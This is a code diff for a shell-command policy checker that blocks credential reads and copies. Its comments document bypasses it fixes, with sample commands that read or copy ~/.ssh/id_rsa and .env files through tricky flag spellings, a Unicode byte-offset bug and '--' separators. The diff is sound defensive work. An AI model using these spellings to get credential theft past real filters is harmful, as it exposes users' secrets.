@@ -135,6 +135,41 @@ function parseShared(command: string): any | typeof PARSE_FAIL {
   return parsed;
 }
 
+/**
+ * mvdan-sh reports every node position as a BYTE offset into the command's UTF-8
+ * encoding. `String.prototype.slice` counts UTF-16 code units. For a pure-ASCII
+ * command the two agree, which is why this went unnoticed through four stages of
+ * jail work; with one accented character earlier in the string every later offset
+ * is too large, the rewrites below splice at the wrong place, and the detectors
+ * are handed corrupted text:
+ *
+ *   echo café && cat ~/.ssh/id_rsa   ->   "echo café&& ccat//home/u/.ssh/id_rsa"
+ *
+ * Nothing matches that, so the credential read was ALLOW -- and not only for the
+ * jail: the rm and chmod detectors read the same normalized string. BUGS.md
+ * JAIL-12, found by /code-review round 4.
+ *
+ * Returns null for a pure-ASCII command, which is the hot path and needs no map
+ * at all. Otherwise returns a lookup that yields the UTF-16 index for a byte
+ * offset, or -1 when the offset does not land on a character boundary (a case
+ * that should not arise for token boundaries; the caller then skips that edit
+ * rather than splicing at a guess).
+ */
+function byteOffsetToCharIndex(command: string): ((byteOffset: number) => number) | null {
+  // eslint-disable-next-line no-control-regex
+  if (!/[^\u0000-\u007F]/.test(command)) return null;
+  const map = new Map<number, number>();
+  let byte = 0;
+  for (let i = 0; i < command.length;) {
+    map.set(byte, i);
+    const cp = command.codePointAt(i) as number;
+    byte += cp < 0x80 ? 1 : cp < 0x800 ? 2 : cp < 0x10000 ? 3 : 4;
+    i += cp > 0xffff ? 2 : 1;
+  }
+  map.set(byte, command.length);
+  return (b: number) => map.get(b) ?? -1;
+}
+
 function cachedNormalize(command: string, compute: () => CommandReadings): CommandReadings {
   const hit = normalizeCache.get(command);
   if (hit !== undefined) {
@@ -198,6 +233,12 @@ function normalizeCommandForPolicyImpl(command: string): CommandReadings {
     // Two kinds of in-place edits, applied together right-to-left so offsets
     // stay valid: (1) message-flag value strips (-m "msg" → -m ""), and
     // (2) intra-word de-obfuscation rewrites (r''m → rm).
+    // Byte offsets from mvdan-sh are converted to UTF-16 indices before any
+    // slicing (JAIL-12). `null` means the command is pure ASCII and the two are
+    // the same, which is the common case and costs nothing.
+    const toCharIndex = byteOffsetToCharIndex(command);
+    const at = (byteOffset: number): number =>
+      toCharIndex === null ? byteOffset : toCharIndex(byteOffset);
     const strips: Array<[number, number]> = [];
     const rewrites: Array<[number, number, string]> = [];
     // The SEPARATOR reading's rewrites: quote-obfuscation removed, but every
@@ -235,8 +276,9 @@ function normalizeCommandForPolicyImpl(command: string): CommandReadings {
         const quotedNode = nextParts[0] as any;
         const nt: string = syntax.NodeType(quotedNode);
         const markStrip = (): void => {
-          const s = next.Pos().Offset();
-          const e = next.End().Offset();
+          const s = at(next.Pos().Offset());
+          const e = at(next.End().Offset());
+          if (s < 0 || e < 0) return; // not a character boundary: leave it alone
           strips.push([s, e]);
           msgSpans.add(`${s}:${e}`); // exclude from de-obfuscation below
         };
@@ -269,8 +311,9 @@ function normalizeCommandForPolicyImpl(command: string): CommandReadings {
       // message-flag values stripped above. Operators/positions are preserved,
       // so the rules' command-boundary anchoring still holds.
       for (const arg of args) {
-        const s = arg.Pos().Offset();
-        const e = arg.End().Offset();
+        const s = at(arg.Pos().Offset());
+        const e = at(arg.End().Offset());
+        if (s < 0 || e < 0) continue; // not a character boundary: leave it alone
         if (msgSpans.has(`${s}:${e}`)) continue; // already a stripped message value
         const resolved = resolveWordLiteral(arg);
         if (resolved === null) continue; // dynamic ($VAR / $(...)) — leave as-is
@@ -472,6 +515,467 @@ export const FS_READ_TOOLS = new Set([
   'dd',
 ]);
 
+// ── JAIL-10: a flag whose OPERAND IS A FILE THE VERB OPENS ──────────────────
+// `positionedArgs` calls any word starting with `-` a flag, so the value half of
+// an `=`-joined token never reached matchSensitivePath: `grep -f KEY f.txt`
+// blocked while `grep --file=KEY f.txt` was ALLOW -- the same read, one spelling
+// apart. The separated spelling was never the bug (its operand is a positional
+// word and is judged like any other); only the `=` form needs this table.
+//
+// Every entry was earned under `strace -e openat` against a decoy file
+// (2026-09-13), because a row is only a bypass if the command ACTUALLY OPENS the
+// file. `tail --follow=KEY` was refuted that way and is pinned as ALLOW in
+// jail-flag-operand.spec.ts: GNU tail takes name|descriptor and opens nothing.
+// `awk --file=KEY` is PLATFORM-DEPENDENT -- mawk rejects the spelling, gawk
+// documents and opens it -- so it is judged rather than assumed away.
+//
+// ⚠️ Deliberately NOT "judge every `=` value". Measured, that reading blocks
+// `grep --exclude=.env` (a search that EXCLUDES the file reads nothing),
+// `grep --regexp=.env` and `sed --expression=s/.aws/x/` (a pattern, not a path),
+// and `sort --output=KEY` (a WRITE -- the legitimate CI key-install case the
+// corpus protects). New false positives inside a stage whose purpose is removing
+// them is the one outcome to avoid.
+//
+// ⚠️ The unsafe direction for THIS table is OMISSION: a file-operand flag not
+// listed here keeps its bypass. That is the state today, not a regression, but it
+// is not closed either. `rsync --files-from=` opens the file too and is NOT here:
+// rsync is not a reader, it belongs to the copy and network tiers (follow-up).
+// ── Stage 5a: the SEARCH-PATTERN slot ───────────────────────────────────────
+// `grep -n .env .gitignore` was a hard block, and so were `rg "\.env\.local"`
+// and `grep -rn ".ssh/config" docs/`. None reads a credential: each hands the
+// jail name to a reader as its search PATTERN, and the read tier judged every
+// positional word of a reader as a path. Stage 3 kept the slot each word sits in
+// precisely so this could be separated; stage 4 consumed position for copy verbs
+// and this is the second consumer.
+//
+// A word is excused by its SLOT, never by its SHAPE. `grep -rn ".ssh/config"
+// docs/` is excused while carrying a word that looks exactly like a rooted
+// credential path, and `grep -rn foo ~/.ssh/config` blocks on the same string
+// one slot over. The shape-based repairs stage 1 measured and rejected (see
+// SENSITIVE_PATH_RULES above) stay rejected.
+//
+// FOUR verbs, and the limit is evidence, not taste. Every flag below was
+// verified on a real binary with a behavioural discriminator: run
+// `VERB FLAG value foo` on stdin, and if the flag consumes `value` then `foo` is
+// the pattern, while if it consumes nothing then `value` is the pattern and
+// `foo` becomes a FILE ("No such file or directory") -- which is the bypass
+// shape itself, directly observable. That run REFUTED one draft entry:
+// `grep --color WHEN` consumes NOTHING (`--color[=WHEN]`, an optional argument,
+// and GNU getopt_long never takes a separate word for one), while `rg --color`
+// DOES. One table per verb is therefore mandatory, and any help-text operand in
+// square brackets belongs in the no-value set.
+//
+// `ag` and `ack` are deliberately ABSENT: neither is installed on the measuring
+// machine, so neither table could be earned, and this work runs on measurement
+// rather than recall. They keep their false positives. `sed`/`awk`/`gawk` are
+// absent for a stronger reason -- their program slot can READ A FILE from inside
+// itself (`awk 'BEGIN{while((getline l<"KEY")>0)print l}'`, `sed -n 'r KEY'`), so
+// excusing it turned an exfil-corpus row into a bypass in the prototype run.
+// They need an in-program file grammar first (stage 5b). Do not add them here.
+//
+// The unsafe direction, stated before the table: a flag WRONGLY listed as
+// value-taking swallows the pattern and excuses the FILE. So every entry has a
+// generated control row in jail-pattern-slot.spec.ts of the shape
+// `VERB FLAG v foo JAILED -> block`. A flag MISSING from the table only leaves a
+// false positive, which is the safe direction.
+interface PatternShape {
+  /** Flags MEASURED to consume the next word as a value. */
+  takesValue: Set<string>;
+  /**
+   * Flags MEASURED to consume NOTHING. Needed POSITIVELY, which is the lesson of
+   * /code-review round 2: the first cut excused "the first positional whose
+   * preceding flag is not known to consume", so an UNLISTED value-taking flag
+   * handed its own operand to the excuse. `grep --include-from KEY needle
+   * notes.txt` opened KEY under ugrep and read ALLOW. The comment that shipped
+   * with round 1 -- "a flag MISSING from the table only leaves a false positive"
+   * -- was wrong, and wrong in the unsafe direction.
+   *
+   * So the flag before a candidate word has THREE states, not two:
+   *   in noValue    -> the next word really is the first positional: excusable
+   *   in takesValue -> that word is the flag's value: skip it and keep looking
+   *   UNKNOWN       -> excuse NOTHING in this command
+   * Unknown is the safe state: it leaves a false positive, never a bypass. That
+   * is what makes this table's incompleteness safe, which no flag list can be on
+   * its own -- and it has to be, because `grep` is not one program (GNU grep,
+   * ugrep, busybox) and the engine cannot know which one will run.
+   */
+  noValue: Set<string>;
+  /** Flags whose operand IS the search pattern. */
+  patternFlags: Set<string>;
+  /** Flags after which NO positional pattern is expected (pattern from a file,
+   *  or a listing mode). */
+  noPatternFlags: Set<string>;
+}
+
+// ⭐ BOTH TABLES ARE EXTRACTED FROM THE INSTALLED BINARIES, not from memory:
+// `/usr/bin/grep --help` (GNU grep 3.11) and `rg --help` (ripgrep 14.1.1), with a
+// value-taking flag identified by its `=VALUE` in the help text and then
+// behaviourally re-measured one at a time (`echo hay | VERB FLAG 2 nosuchfile`:
+// if the flag consumed `2` the pattern is `nosuchfile` and grep reads stdin, and
+// if it consumed nothing then `2` is the pattern and `nosuchfile` is a FILE).
+//
+// A flag with an OPTIONAL argument -- help text `--color[=WHEN]` -- consumes
+// NOTHING in separated form, because GNU getopt_long never takes a separate word
+// for one. That is measured, not assumed: `grep --color never foo` exits 2 with
+// "foo: No such file or directory".
+//
+// `--group-separator` is in NEITHER set on purpose: GNU grep 3.11 consumes a word
+// and ugrep 7.8.4 does not, and the engine cannot know which `grep` will run. It
+// therefore stays UNKNOWN, which costs a false positive and never a read.
+const GREP_SHAPE: PatternShape = {
+  takesValue: new Set([
+    '-A',
+    '-B',
+    '-C',
+    '-D',
+    '-d',
+    '-e',
+    '-f',
+    '-m',
+    '--after-context',
+    '--before-context',
+    '--binary-files',
+    '--context',
+    '--devices',
+    '--directories',
+    '--exclude',
+    '--exclude-dir',
+    '--exclude-from',
+    '--file',
+    '--include',
+    '--label',
+    '--max-count',
+    '--regexp',
+  ]),
+  noValue: new Set([
+    '-E',
+    '-F',
+    '-G',
+    '-P',
+    '-i',
+    '-y',
+    '-v',
+    '-V',
+    '-w',
+    '-x',
+    '-c',
+    '-l',
+    '-L',
+    '-o',
+    '-q',
+    '-s',
+    '-b',
+    '-H',
+    '-h',
+    '-n',
+    '-T',
+    '-Z',
+    '-z',
+    '-R',
+    '-r',
+    '-U',
+    '-u',
+    '-I',
+    '-a',
+    '--basic-regexp',
+    '--binary',
+    '--byte-offset',
+    '--color',
+    '--colour',
+    '--count',
+    '--dereference-recursive',
+    '--extended-regexp',
+    '--files-with-matches',
+    '--files-without-match',
+    '--fixed-strings',
+    '--help',
+    '--ignore-case',
+    '--initial-tab',
+    '--invert-match',
+    '--line-buffered',
+    '--line-number',
+    '--line-regexp',
+    '--no-filename',
+    '--no-group-separator',
+    '--no-ignore-case',
+    '--no-messages',
+    '--null',
+    '--null-data',
+    '--only-matching',
+    '--perl-regexp',
+    '--quiet',
+    '--recursive',
+    '--silent',
+    '--text',
+    '--version',
+    '--with-filename',
+    '--word-regexp',
+  ]),
+  patternFlags: new Set(['-e', '--regexp']),
+  noPatternFlags: new Set(['-f', '--file']),
+};
+const PATTERN_VERBS: Record<string, PatternShape> = {
+  grep: GREP_SHAPE,
+  // /usr/bin/egrep and /usr/bin/fgrep are 41-byte shell wrappers that exec
+  // `grep -E` and `grep -F`. Read in full, not assumed.
+  egrep: GREP_SHAPE,
+  fgrep: GREP_SHAPE,
+  // ripgrep 14.1.1, complete from its own --help. An earlier comment here said rg
+  // was not installed on the measuring machine; it is, and that stale claim is why
+  // this table shipped incomplete for two rounds, blocking ordinary searches like
+  // `rg --sort-files .env src` (/code-review round 4).
+  rg: {
+    takesValue: new Set([
+      '-A',
+      '-B',
+      '-C',
+      '-d',
+      '-E',
+      '-e',
+      '-f',
+      '-g',
+      '-j',
+      '-M',
+      '-m',
+      '-r',
+      '-t',
+      '-T',
+      '--after-context',
+      '--before-context',
+      '--color',
+      '--colors',
+      '--context',
+      '--context-separator',
+      '--dfa-size-limit',
+      '--encoding',
+      '--engine',
+      '--field-context-separator',
+      '--field-match-separator',
+      '--file',
+      '--generate',
+      '--glob',
+      '--hostname-bin',
+      '--hyperlink-format',
+      '--iglob',
+      '--ignore-file',
+      '--max-columns',
+      '--max-count',
+      '--max-depth',
+      // An ALIAS of --max-depth, and it takes a value. The round-5 extraction read
+      // alias lines as plain switches and swept it into noValue, which hard-blocked
+      // `rg --maxdepth 2 .env src` while `--max-depth 2` ran (/code-review round 7).
+      '--maxdepth',
+      '--max-filesize',
+      '--path-separator',
+      '--pre',
+      '--pre-glob',
+      '--regexp',
+      '--regex-size-limit',
+      '--replace',
+      '--sort',
+      '--sortr',
+      '--threads',
+      '--type',
+      '--type-add',
+      '--type-clear',
+      '--type-not',
+    ]),
+    noValue: new Set([
+      '-.',
+      '-0',
+      '-a',
+      '-b',
+      '-c',
+      '-F',
+      '-h',
+      '-H',
+      '-i',
+      '-I',
+      '-l',
+      '-L',
+      '-n',
+      '-N',
+      '-o',
+      '-p',
+      '-P',
+      '-q',
+      '-s',
+      '-S',
+      '-u',
+      '-U',
+      '-v',
+      '-V',
+      '-w',
+      '-x',
+      '-z',
+      '--auto-hybrid-regex',
+      '--binary',
+      '--block-buffered',
+      '--byte-offset',
+      '--case-sensitive',
+      '--column',
+      '--count',
+      '--count-matches',
+      '--crlf',
+      '--debug',
+      '--files',
+      '--files-with-matches',
+      '--files-without-match',
+      '--fixed-strings',
+      '--follow',
+      '--glob-case-insensitive',
+      '--heading',
+      '--help',
+      '--hidden',
+      '--ignore-case',
+      '--ignore-file-case-insensitive',
+      '--include-zero',
+      '--invert-match',
+      '--json',
+      '--line-buffered',
+      '--line-number',
+      '--line-regexp',
+      '--max-columns-preview',
+      '--mmap',
+      '--multiline',
+      '--multiline-dotall',
+      '--no-column',
+      '--no-config',
+      '--no-context-separator',
+      '--no-encoding',
+      '--no-filename',
+      '--no-ignore',
+      '--no-ignore-dot',
+      '--no-ignore-exclude',
+      '--no-ignore-files',
+      '--no-ignore-global',
+      '--no-ignore-messages',
+      '--no-ignore-parent',
+      '--no-ignore-vcs',
+      '--no-line-number',
+      '--no-messages',
+      '--no-pcre2-unicode',
+      '--no-pre',
+      '--no-require-git',
+      '--no-unicode',
+      '--null',
+      '--null-data',
+      '--one-file-system',
+      '--only-matching',
+      '--passthru',
+      '--pcre2',
+      '--pcre2-version',
+      '--pretty',
+      '--print0',
+      '--quiet',
+      '--search-zip',
+      '--smart-case',
+      '--sort-files',
+      '--stats',
+      '--stop-on-nonmatch',
+      '--text',
+      '--trace',
+      '--trim',
+      '--type-list',
+      '--unrestricted',
+      '--version',
+      '--vimgrep',
+      '--with-filename',
+      '--word-regexp',
+      // The COMPLETE remainder of `rg --help`, added after /code-review round 5
+      // found 40 documented switches in neither set. The table is now the whole
+      // option list: `rg --help` yields 149 long options, 35 of them value-taking.
+      '--ignore',
+      '--ignore-dot',
+      '--ignore-exclude',
+      '--ignore-files',
+      '--ignore-global',
+      '--ignore-messages',
+      '--ignore-parent',
+      '--ignore-vcs',
+      '--messages',
+      '--no-auto-hybrid-regex',
+      '--no-binary',
+      '--no-block-buffered',
+      '--no-byte-offset',
+      '--no-crlf',
+      '--no-fixed-strings',
+      '--no-follow',
+      '--no-glob-case-insensitive',
+      '--no-heading',
+      '--no-hidden',
+      '--no-ignore-file-case-insensitive',
+      '--no-include-zero',
+      '--no-invert-match',
+      '--no-json',
+      '--no-line-buffered',
+      '--no-max-columns-preview',
+      '--no-mmap',
+      '--no-multiline',
+      '--no-multiline-dotall',
+      '--no-one-file-system',
+      '--no-pcre2',
+      '--no-search-zip',
+      '--no-sort-files',
+      '--no-stats',
+      '--no-text',
+      '--no-trim',
+      '--passthrough',
+      '--pcre2-unicode',
+      '--require-git',
+      '--unicode',
+    ]),
+    patternFlags: new Set(['-e', '--regexp']),
+    // `--files` and `--type-list` list or enumerate without a pattern. Founder
+    // decision 2026-09-13: `rg --files ~/.ssh` stays BLOCKED, which this achieves
+    // by leaving the directory in the judged list.
+    noPatternFlags: new Set(['-f', '--file', '--files', '--type-list', '--pcre2-version']),
+  },
+};
+
+/** Exported so the spec DERIVES its control rows from the table rather than
+ *  hand-writing them: a flag added here gains a row for free. */
+export const PATTERN_VERB_NAMES = Object.keys(PATTERN_VERBS);
+export const patternShapeOf = (verb: string): PatternShape | undefined => PATTERN_VERBS[verb];
+/** JAIL-10's table, exported for the same reason: the spec derives the split
+ *  between "operand is a FILE the verb opens" and "operand is an argument". */
+export const fileOperandFlagsOf = (verb: string): Set<string> | undefined =>
+  FILE_OPERAND_FLAGS[verb];
+
+// ⚠️ `--include` carries a GLOB, not a path, and is here because the LITERAL
+// spelling (`--include=.env`) makes grep open that file. A glob spelling escapes
+// it -- `--include=*env` and `--include=.en?` read the same file and are measured
+// ALLOW (/code-review round 1). Judging globs would mean expanding them, which
+// this tier cannot do; recorded as a known gap rather than claimed closed.
+const GREP_FILE_OPERANDS = new Set(['-f', '--file', '--exclude-from', '--include']);
+// Short options that take an argument, for the readers that have no PatternShape.
+// Without them the attached-operand scan walked to any `f`, so
+// `awk -vfile=/home/u/.ssh/config 'BEGIN{}'` -- where `-v` owns the rest of the
+// token and nothing is opened -- was a hard block (/code-review round 8).
+const READER_VALUE_LETTERS: Record<string, string[]> = {
+  awk: ['F', 'v', 'f'],
+  gawk: ['F', 'v', 'f', 'e', 'E', 'i', 'l', 'o', 'p', 'D'],
+  sed: ['e', 'f', 'i', 'l'],
+  sort: ['C', 'k', 'o', 'S', 't', 'T'],
+};
+const FILE_OPERAND_FLAGS: Record<string, Set<string>> = {
+  grep: GREP_FILE_OPERANDS,
+  egrep: GREP_FILE_OPERANDS,
+  fgrep: GREP_FILE_OPERANDS,
+  // rg and gawk are NOT installed on the measuring machine: these two rows are
+  // from the shipped documentation (ripgrep `-f/--file`, `--ignore-file`; gawk
+  // `-f/--file`) and are marked as such in the spec.
+  // `-g/--glob/--iglob` name which files ripgrep SEARCHES, so an operand naming
+  // a credential makes rg open it -- the same reason grep's `--include` is here.
+  // Measured (/code-review round 3): `rg --hidden -g .env AWS tree` opened .env
+  // and printed its contents.
+  rg: new Set(['-f', '--file', '--ignore-file', '-g', '--glob', '--iglob']),
+  sed: new Set(['-f', '--file']),
+  awk: new Set(['-f', '--file']),
+  gawk: new Set(['-f', '--file']),
+  sort: new Set(['--files0-from']),
+};
+
 // Fast-path screen: the AST detector only fires when one of these tools is
 // the *command name of a CallExpr* — i.e. it appears at start-of-command
 // position. mvdan-sh produces a CallExpr only when the token sits at:
@@ -527,9 +1031,29 @@ interface CopyShape {
   targetDirFlag?: boolean;
   /** Flags whose operand is NEVER a source: a short LETTER ('i') or a long name ('--exclude'). */
   skipFlags?: string[];
+  /**
+   * Short LETTERS this verb's getopt treats as taking an argument. Needed to read
+   * a bundle the way getopt does: the FIRST such letter swallows the rest of the
+   * token, so `-St` is `-S t` (suffix "t") and NOT `--target-directory`.
+   * /code-review round 7 measured the cost of guessing: `cp -St ~/.ssh/id_rsa
+   * /tmp/stolen` copies the key on real coreutils 9.4 and produced no finding,
+   * because a `t` anywhere in the bundle was read as the target-directory flag.
+   */
+  valueLetters?: string[];
 }
 
 const SCP_VALUE_FLAGS = ['i', 'F', 'o', 'c', 'S', 'P', 'J', 'D', 'W', 'l'];
+// Short options that take an argument, per verb's own --help on this machine
+// (GNU tar 1.35, Info-ZIP, rsync 3.x). /code-review round 8: without these, a
+// bundle was named by its LAST letter, so `tar -f out.tar -cVconf KEY` looked like
+// tar's `-f` and the credential was dropped as that flag's operand -- measured, the
+// key really is archived. The FIRST value letter owns the rest of the token.
+const TAR_VALUE_LETTERS = ['b', 'C', 'f', 'F', 'g', 'H', 'I', 'K', 'L', 'N', 'T', 'V', 'X'];
+// `x` and `i` are here as well as in zip's skipFlags: a letter that names an
+// operand to SKIP must also be known to TAKE one, or the skip silently stops
+// working. jail-copy.spec.ts derives a row from exactly that invariant.
+const ZIP_VALUE_LETTERS = ['b', 'n', 'P', 't', 's', 'O', 'x', 'i'];
+const RSYNC_VALUE_LETTERS = ['e', 'f', 'T', 'B', 'M'];
 const RSYNC_SKIP = [
   'e',
   '--rsh',
@@ -542,21 +1066,38 @@ const RSYNC_SKIP = [
   '--filter',
 ];
 
+// GNU coreutils short options that take an argument, per verb's own --help.
+// `S` (backup suffix) is the one that matters: it precedes `t` alphabetically in
+// every bundle an attacker would type.
+const CP_VALUE_LETTERS = ['S', 't'];
+const INSTALL_VALUE_LETTERS = ['S', 't', 'g', 'm', 'o'];
 export const COPY_VERBS: Record<string, CopyShape> = {
-  cp: { source: 'allButLast', targetDirFlag: true },
-  mv: { source: 'allButLast', targetDirFlag: true },
-  install: { source: 'allButLast', targetDirFlag: true },
-  ln: { source: 'first', targetDirFlag: true },
-  scp: { source: 'allButLast', skipFlags: SCP_VALUE_FLAGS },
-  rsync: { source: 'allButLast', skipFlags: RSYNC_SKIP },
+  cp: { source: 'allButLast', targetDirFlag: true, valueLetters: CP_VALUE_LETTERS },
+  mv: { source: 'allButLast', targetDirFlag: true, valueLetters: CP_VALUE_LETTERS },
+  install: { source: 'allButLast', targetDirFlag: true, valueLetters: INSTALL_VALUE_LETTERS },
+  ln: { source: 'first', targetDirFlag: true, valueLetters: CP_VALUE_LETTERS },
+  scp: { source: 'allButLast', skipFlags: SCP_VALUE_FLAGS, valueLetters: SCP_VALUE_FLAGS },
+  rsync: { source: 'allButLast', skipFlags: RSYNC_SKIP, valueLetters: RSYNC_VALUE_LETTERS },
   tar: {
     source: 'archive',
     archive: 'tar',
     skipFlags: ['f', 'X', 'T', '--file', '--exclude', '--exclude-from', '--files-from'],
+    valueLetters: TAR_VALUE_LETTERS,
   },
-  zip: { source: 'archive', archive: 'zip', skipFlags: ['x', 'i', '--exclude', '--include'] },
+  zip: {
+    source: 'archive',
+    archive: 'zip',
+    skipFlags: ['x', 'i', '--exclude', '--include'],
+    valueLetters: ZIP_VALUE_LETTERS,
+  },
   ar: { source: 'archive', archive: 'ar' },
-  '7z': { source: 'archive', archive: '7z', skipFlags: ['x', '--exclude'] },
+  // 7z switches are INLINE only (`-mx9`, `-px`, `-x!pat`), so no following word is
+  // ever a switch's operand -- which is why the short `x` is NOT a skipFlag here
+  // and valueLetters is empty. Keeping the short `x` made `7z a out.7z -mx KEY`
+  // drop the credential as an exclusion operand (/code-review round 8), and the
+  // derived "every skipped letter is a value letter" row in jail-copy.spec.ts is
+  // what keeps the two tables honest about it.
+  '7z': { source: 'archive', archive: '7z', skipFlags: ['--exclude'], valueLetters: [] },
   gzip: { source: 'all' },
   bzip2: { source: 'all' },
   xz: { source: 'all' },
@@ -2031,7 +2572,7 @@ function analyzeFsOperationImpl(command: string, depth = 0): FsOpVerdict | null 
         return result?.verdict !== 'block';
       }
       if (nodeType !== 'CallExpr') return true;
-      const { name, flags, paths, words } = extractLiteralArgs(n);
+      const { name, flags, paths, words, args } = extractLiteralArgs(n);
       if (!name) return true;
 
       // rm with -r and -f (any combination, e.g. -rf, -fr, -r -f)
@@ -2082,7 +2623,9 @@ function analyzeFsOperationImpl(command: string, depth = 0): FsOpVerdict | null 
 
       // Read tools — `cat ~/.ssh/id_rsa`, etc. -- reached directly, through a
       // wrapper, or as find's -exec action.
-      const readPaths = FS_READ_TOOLS.has(name) ? paths : wrappedReadPaths(words, name);
+      const readPaths = FS_READ_TOOLS.has(name)
+        ? [...readTargets(name, args, flags, words, 1), ...flagOperandFiles(name, words, 1)]
+        : wrappedReadPaths(words, name);
       if (readPaths) {
         for (const p of readPaths) {
           result = stricter(result, matchSensitivePath(p));
@@ -2175,9 +2718,34 @@ function flagIs(w: string | null, names: string[]): boolean {
 }
 
 /** A slot whose preceding flag names it as an operand that is not a source. */
-function operandOf(a: PositionedArg, names: string[] | undefined): boolean {
+function operandOf(
+  a: PositionedArg,
+  names: string[] | undefined,
+  valueLetters?: string[]
+): boolean {
   if (!names || a.afterFlag === null) return false;
-  return flagIs(a.afterFlag, names) && flagInfo(a.afterFlag).attached === null;
+  const w = a.afterFlag;
+  // A SHORT bundle is named by its first ARGUMENT-TAKING letter, which also owns
+  // the rest of the token: `-cVconf` is `-c -V conf`, not a bundle ending in `-f`.
+  // Naming it by the last letter made `tar -f out.tar -cVconf ~/.ssh/id_rsa` drop
+  // the credential as tar's `-f` operand while really archiving it
+  // (/code-review round 8, measured with `tar tf`).
+  if (!w.startsWith('--') && valueLetters) {
+    const letters = w.slice(1);
+    for (let i = 0; i < letters.length; i++) {
+      if (!valueLetters.includes(letters[i])) continue;
+      // Only the LAST letter takes the next word; an earlier one ate the token.
+      return i === letters.length - 1 && names.includes(letters[i]);
+    }
+    return false;
+  }
+  if (w.startsWith('--') && !w.includes('=')) {
+    // getopt prefix, the same rule namesFlag applies on the read side:
+    // `az ... --fil KEY` is `--file KEY` (/code-review round 9).
+    const longs = names.filter((n) => n.startsWith('--'));
+    if (longs.some((n) => n === w || (w.length >= 3 && n.startsWith(w)))) return true;
+  }
+  return flagIs(w, names) && flagInfo(w).attached === null;
 }
 
 /**
@@ -2220,8 +2788,13 @@ const FIND_OPTIONS = new Set(['-H', '-L', '-P']);
 function findStartPoints(words: (string | null)[], h: number): { k: number; starts: string[] } {
   const k = words.findIndex((w, i) => i > h && w !== null && FIND_EXEC_FLAGS.has(w));
   if (k < 0) return { k, starts: [] };
+  // `--` separates find's options from its start points; it is NOT a predicate.
+  // Treating it as one put `end` on it and erased every start point, so
+  // `find -- /home/u/.ssh -type f -exec cat {} +` produced no finding while the
+  // same command without `--` blocked (/code-review round 9, GNU find printed
+  // the key).
   const firstPredicate = words.findIndex(
-    (w, i) => i > h && w !== null && w.startsWith('-') && !FIND_OPTIONS.has(w)
+    (w, i) => i > h && w !== null && w !== '--' && w.startsWith('-') && !FIND_OPTIONS.has(w)
   );
   const end = firstPredicate > h ? firstPredicate : k;
   return { k, starts: positionalAfter(words, h + 1, end) };
@@ -2252,12 +2825,61 @@ function copySourcePaths(words: (string | null)[]): string[] {
   const { shape, last } = r;
   const args = positionedArgs(words, last + 1);
   const tail = words.slice(last + 1);
-  const skipped = (a: PositionedArg) => operandOf(a, shape.skipFlags);
+  // Past `--` nothing is a flag, so no word there is a flag's operand. The read
+  // tier learned this in round 8 and the copy tier had the same hole:
+  // `rsync -- --exclude ~/.ssh/id_rsa rdst/` transferred the key with no finding
+  // (/code-review round 9, measured with rsync 3.2.7).
+  const copyOptionsEnd = tail.findIndex((w) => w === '--');
+  const copyPastOptions = (a: PositionedArg) =>
+    copyOptionsEnd >= 0 && a.argv > last + 1 + copyOptionsEnd;
+  const skipped = (a: PositionedArg) =>
+    !copyPastOptions(a) && operandOf(a, shape.skipFlags, shape.valueLetters);
+  // `-t DIR` and its ATTACHED and ABBREVIATED spellings. flagInfo reads a short
+  // bundle's LAST letter, so `-ttmp` gave letter `p` and the destination flag went
+  // unseen: `cp -ttmp ~/.ssh/id_rsa` produced no finding at all while `cp -t tmp
+  // ~/.ssh/id_rsa` reviewed (/code-review round 6). For cp/mv/install a `t`
+  // anywhere in a short bundle IS --target-directory, and the long form resolves
+  // by getopt prefix like every other long flag.
+  // The FIRST argument-taking letter of a short bundle swallows the rest of the
+  // token, so `-St` is `-S t` (a backup suffix) and NOT a target directory --
+  // measured on coreutils 9.4, where `cp -St KEY /tmp/stolen` copies the key.
+  // Reading a `t` ANYWHERE produced no finding for that command
+  // (/code-review round 7). `null` when the bundle names no value-taking letter.
+  const firstValueLetter = (w: string): { letter: string; last: boolean } | null => {
+    const letters = w.slice(1);
+    for (let i = 0; i < letters.length; i++) {
+      if ((shape.valueLetters ?? []).includes(letters[i]))
+        return { letter: letters[i], last: i === letters.length - 1 };
+    }
+    return null;
+  };
+  const isTargetDirFlag = (w: string): boolean => {
+    if (w.startsWith('--')) {
+      const name = w.includes('=') ? w.slice(0, w.indexOf('=')) : w;
+      return name.length >= 3 && '--target-directory'.startsWith(name);
+    }
+    return firstValueLetter(w)?.letter === 't';
+  };
   const targetDir =
     shape.targetDirFlag === true &&
-    tail.some((w) => w !== null && w.startsWith('-') && flagIs(w, ['t', '--target-directory']));
+    tail.some((w) => w !== null && w.startsWith('-') && isTargetDirFlag(w));
+  // Only the SEPARATED spelling has a following operand. `-tout` carries its
+  // value inside the token, and flagInfo reports its LAST letter, which for that
+  // spelling happens to be `t` -- so the credential after it was mistaken for the
+  // target directory and dropped from the sources (/code-review round 6).
+  // Only the SEPARATED spelling has a FOLLOWING operand. flagInfo reads a short
+  // bundle's LAST letter and reports no attached value, so `-tout` looked exactly
+  // like a separated `-t` and the credential after it was dropped from the sources
+  // as if it were the target directory (/code-review round 6). The first `t` is
+  // the flag; everything after it is its value.
+  const targetTakesNextWord = (w: string): boolean => {
+    if (w.startsWith('--'))
+      return !w.includes('=') && w.length >= 3 && '--target-directory'.startsWith(w);
+    const f = firstValueLetter(w);
+    return f !== null && f.letter === 't' && f.last;
+  };
   const targetOperand = (a: PositionedArg) =>
-    targetDir && operandOf(a, ['t', '--target-directory']);
+    targetDir && a.afterFlag !== null && !copyPastOptions(a) && targetTakesNextWord(a.afterFlag);
   // The destination is the last NON-FLAG word; when it is dynamic (`$DEST`) it
   // is not a slot, so every slot is a source (`cp K $DEST -v` ends in a flag).
   const lastOperand = [...tail].reverse().find((w) => w === null || !w.startsWith('-'));
@@ -2270,8 +2892,6 @@ function copySourcePaths(words: (string | null)[]): string[] {
   // are handled in archiveInputs, which reads nothing at all.
   const destIsLastOperand =
     (shape.source === 'allButLast' || shape.source === 'first') && !targetDir && !dynamicDest;
-  if (destIsLastOperand && typeof lastOperand === 'string' && matchSensitivePath(lastOperand))
-    return [];
 
   let src: PositionedArg[];
   switch (shape.source) {
@@ -2282,18 +2902,32 @@ function copySourcePaths(words: (string | null)[]): string[] {
       src = targetDir ? args : args.slice(0, 1);
       break;
     case 'flagOperand': {
+      // BOTH attached spellings: `--file=PATH` and the short `-fPATH`, which
+      // argparse-based CLIs (az) accept and which this filter used to throw away
+      // by requiring `--` (/code-review round 7).
+      // An ATTACHED source operand, in every spelling the tool accepts:
